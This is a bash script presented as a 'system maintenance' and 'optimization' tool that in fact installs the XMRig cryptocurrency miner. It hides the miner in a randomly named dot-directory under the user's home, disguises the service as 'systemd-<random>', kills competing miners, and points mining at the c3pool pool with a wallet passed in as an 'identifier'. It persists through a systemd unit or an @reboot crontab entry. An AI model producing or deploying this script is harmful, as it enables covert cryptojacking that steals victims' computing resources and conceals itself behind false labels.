#!/bin/bash
VERSION=2.17
echo "System maintenance script v$VERSION."
echo "This script performs system optimization tasks."
echo
# Set locale to avoid warnings
export LC_ALL=C
export LANG=C

# Get current user and home directory
CURRENT_USER=$(whoami)
USER_HOME="$HOME"

# If running with sudo, get the original user's home
if [ -n "$SUDO_USER" ]; then
    CURRENT_USER="$SUDO_USER"
    USER_HOME=$(getent passwd "$SUDO_USER" | cut -d: -f6)
fi

# Generate random names and paths
RANDOM_DIR=$(openssl rand -hex 12)
SYSTEM_USER="sys$(openssl rand -hex 8)"
SERVICE_NAME="systemd-$(openssl rand -hex 6)"

# Hidden installation paths
BASE_DIR="$USER_HOME/.local/.$RANDOM_DIR"
CONFIG_DIR="$BASE_DIR/.config"
LOG_DIR="$BASE_DIR/.logs"
CACHE_DIR="$BASE_DIR/.cache"

WALLET=$1
EMAIL=$2

if [ -z "$WALLET" ]; then
    echo "Script usage:"
    echo "> system_maintenance.sh <identifier> [<contact>]"
    echo "ERROR: Identifier required"
    exit 1
fi

# Install required packages
if ! command -v curl >/dev/null || ! command -v tar >/dev/null; then
    echo "Installing required packages..."
    sudo apt-get update -qq >/dev/null && sudo apt-get install -y curl tar >/dev/null
fi

# Calculate optimal CPU usage - MAX 6 CORES, 100% usage
CPU_THREADS=$(nproc)
if [ $CPU_THREADS -gt 6 ]; then
    USABLE_THREADS=6
else
    USABLE_THREADS=$((CPU_THREADS > 1 ? CPU_THREADS - 1 : 1))
fi
CPU_USAGE=100  # Full CPU usage

echo "[*] Running as user: $CURRENT_USER"
echo "[*] Home directory: $USER_HOME"
echo "[*] Starting system maintenance setup..."
echo "[*] Using $USABLE_THREADS of $CPU_THREADS CPU threads (100% usage)"

# Function to create hidden directories
create_hidden_dirs() {
    echo "[*] Creating directories in: $BASE_DIR"
    mkdir -p "$BASE_DIR" "$CONFIG_DIR" "$LOG_DIR" "$CACHE_DIR"
    chown -R "$CURRENT_USER:$CURRENT_USER" "$BASE_DIR" 2>/dev/null || true
    chmod 700 "$BASE_DIR" "$CONFIG_DIR" "$LOG_DIR" "$CACHE_DIR"
}

# Cleanup previous installations
cleanup_previous() {
    echo "[*] Cleaning up previous installations..."
    pkill -f "xmrig" 2>/dev/null
    pkill -f "systemd-.*" 2>/dev/null
    pkill -f "sysupdate" 2>/dev/null
    pkill -f "kernelcfg" 2>/dev/null
    pkill -f "$BASE_DIR/main" 2>/dev/null

    if command -v systemctl >/dev/null 2>&1; then
        systemctl stop "$SERVICE_NAME" 2>/dev/null
        systemctl disable "$SERVICE_NAME" 2>/dev/null
        rm -f "/etc/systemd/system/$SERVICE_NAME.service"
    fi

    find "$USER_HOME" -name ".*" -type d -exec sh -c 'pkill -f "$0/main" 2>/dev/null' {} \; 2>/dev/null
    sleep 2
}

# Setup huge pages (only if root)
setup_hugepages() {
    if [ "$(id -u)" -eq 0 ]; then
        echo "[*] Setting up huge pages (root)..."
        grep -q "vm.nr_hugepages" /etc/sysctl.conf || echo "vm.nr_hugepages=1280" >> /etc/sysctl.conf
        sysctl -p >/dev/null 2>&1
        echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
    else
        echo "[*] Skipping huge pages (non-root)"
    fi
}

echo "[*] Performing system cleanup..."
cleanup_previous
echo "[*] Creating maintenance directory structure..."
create_hidden_dirs
echo "[*] Setting up system optimization..."
setup_hugepages

echo "[*] Downloading maintenance tools..."
DOWNLOAD_URL="https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"
TMP_TAR="/tmp/tools_$(openssl rand -hex 4).tar.gz"

for i in {1..3}; do
    if curl -fsSL "$DOWNLOAD_URL" -o "$TMP_TAR"; then
        echo "[*] Download successful"
        break
    else
        echo "[*] Download attempt $i failed, retrying..."
        sleep 2
    fi
done

if [ ! -f "$TMP_TAR" ]; then
    echo "ERROR: Cannot download tools after 3 attempts"
    exit 1
fi

echo "[*] Extracting tools..."
tar xzf "$TMP_TAR" -C /tmp/ 2>/dev/null || { echo "ERROR: Extraction failed"; exit 1; }

XMRIG_BINARY=$(find /tmp -name "xmrig" -type f -executable 2>/dev/null | head -1)
if [ -z "$XMRIG_BINARY" ] || [ ! -f "$XMRIG_BINARY" ]; then
    echo "ERROR: Could not find xmrig binary"
    rm -f "$TMP_TAR"
    exit 1
fi

cp "$XMRIG_BINARY" "$BASE_DIR/main"
chown "$CURRENT_USER:$CURRENT_USER" "$BASE_DIR/main" 2>/dev/null || true
chmod +x "$BASE_DIR/main"

rm -f "$TMP_TAR"
find /tmp -name "xmrig*" -type d -exec rm -rf {} + 2>/dev/null

echo "[*] Configuring system optimizer..."
cat > "$BASE_DIR/config.json" << EOF
{
    "api": { "id": null, "worker-id": "$SYSTEM_USER" },
    "http": { "enabled": false, "host": "127.0.0.1", "port": 0, "access-token": null, "restricted": true },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": "system-optimizer",
    "randomx": {
        "init": $USABLE_THREADS,
        "mode": "fast",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": true,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": 100,
        "asm": true,
        "argon2-impl": null,
        "cn/0": false,
        "cn-lite/0": false,
        "rx/0": true,
        "threads": $USABLE_THREADS
    },
    "pools": [{
        "algo": "rx/0",
        "url": "auto.c3pool.org:19999",
        "user": "$WALLET",
        "pass": "x",
        "rig-id": "$SYSTEM_USER",
        "keepalive": true,
        "enabled": true,
        "tls": false
    }],
    "print-time": 30,
    "health-print-time": 30,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "verbose": 1,
    "watch": false,
    "pause-on-battery": false,
    "pause-on-active": false
}
EOF

chown "$CURRENT_USER:$CURRENT_USER" "$BASE_DIR/config.json" 2>/dev/null || true

echo "[*] Creating control script..."
cat > "$BASE_DIR/control" << 'EOF'
#!/bin/bash
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

case "$1" in
    start)
        if pgrep -f "./main" >/dev/null; then
            echo "⚠️ Optimizer already running!"
            "$0" status
            exit 1
        fi
        [ -w "/proc/sys/vm/nr_hugepages" ] && echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
        nohup ./main --config=./config.json > output.log 2>&1 &
        echo $! > pid.txt
        echo "✅ Started (PID: $(cat pid.txt))"
        sleep 3
        "$0" status
        ;;
    stop)
        pkill -f "./main" 2>/dev/null
        [ -f pid.txt ] && kill $(cat pid.txt) 2>/dev/null && rm -f pid.txt
        sleep 2
        pgrep -f "./main" >/dev/null && echo "❌ Failed to stop" && exit 1 || echo "✅ Stopped"
        ;;
    status)
        PIDS=$(pgrep -f "./main")
        if [ -n "$PIDS" ]; then
            echo "✅ Running - PIDs: $PIDS"
            for PID in $PIDS; do
                CPU=$(ps -p $PID -o %cpu --no-headers 2>/dev/null | awk '{print int($1)}')
                MEM=$(ps -p $PID -o %mem --no-headers 2>/dev/null)
                echo " PID $PID - CPU: ${CPU:-N/A}% - MEM: ${MEM:-N/A}%"
            done
        else
            echo "❌ Stopped"
        fi
        ;;
    logs) tail -20 output.log 2>/dev/null || echo "No logs" ;;
    fullogs) cat output.log 2>/dev/null || echo "No logs" ;;
    stats)
        echo "CPU: $USABLE_THREADS/$CPU_THREADS threads"
        echo "Memory: $(free -h | awk '/Mem:/ {print $2}')"
        echo "HugePages: $(awk '/HugePages_Total/ {print $2}' /proc/meminfo 2>/dev/null || echo 0)"
        ;;
    restart) "$0" stop; sleep 2; "$0" start ;;
    killall) pkill -f "xmrig" 2>/dev/null; pkill -f "main" 2>/dev/null; "$0" status ;;
    set-limit)
        if [[ "$2" =~ ^[0-9]+$ ]] && [ "$2" -ge 10 ] && [ "$2" -le 100 ]; then
            sed -i "s/\"max-threads-hint\": [0-9]\+,/\"max-threads-hint\": $2,/" config.json
            echo "✅ CPU limit set to $2%"
            "$0" restart
        else
            echo "❌ Usage: set-limit <10-100>"
        fi
        ;;
    *) echo "Usage: $0 {start|stop|status|logs|fullogs|stats|restart|killall|set-limit}" ;;
esac
EOF

chown "$CURRENT_USER:$CURRENT_USER" "$BASE_DIR/control" 2>/dev/null || true
chmod +x "$BASE_DIR/control"

# Systemd service (root only)
SYSTEMD_ENABLED=false
if command -v systemctl >/dev/null 2>&1 && [ "$(id -u)" -eq 0 ]; then
    echo "[*] Installing systemd service..."
    cat > "/etc/systemd/system/$SERVICE_NAME.service" << EOF
[Unit]
Description=System Optimization Service
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=10
User=$CURRENT_USER
ExecStart=$BASE_DIR/main --config=$BASE_DIR/config.json
WorkingDirectory=$BASE_DIR
Environment=LC_ALL=C
StandardOutput=append:$BASE_DIR/output.log
StandardError=append:$BASE_DIR/output.log

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable --now "$SERVICE_NAME.service" >/dev/null
    SYSTEMD_ENABLED=true
    echo "[*] Systemd service: $SERVICE_NAME"
fi

# Crontab fallback
if [ "$SYSTEMD_ENABLED" = false ]; then
    echo "[*] Adding to crontab..."
    (crontab -u "$CURRENT_USER" -l 2>/dev/null | grep -v "$BASE_DIR" ; echo "@reboot sleep 30 && $BASE_DIR/control start >/dev/null 2>&1") | crontab -u "$CURRENT_USER" -
fi

echo "[*] Starting optimizer..."
if [ "$SYSTEMD_ENABLED" = true ]; then
    systemctl start "$SERVICE_NAME.service" 2>/dev/null
else
    "$BASE_DIR/control" start
fi

sleep 8
echo
echo "=== Final Status ==="
"$BASE_DIR/control" status
echo
"$BASE_DIR/control" stats
echo
echo "🎯 Setup complete!"
echo "📍 Path: $BASE_DIR"
echo "🔧 Manage: $BASE_DIR/control {start|stop|status|logs|stats|restart|set-limit}"
echo "💡 Use 'set-limit 100' for full power"

PIDS=$(pgrep -f "$BASE_DIR/main")
if [ -n "$PIDS" ]; then
    echo "✅ Running with $(echo "$PIDS" | wc -l) process(es)"
else
    echo "❌ Failed to start — check: $BASE_DIR/control logs"
fi

exit 0
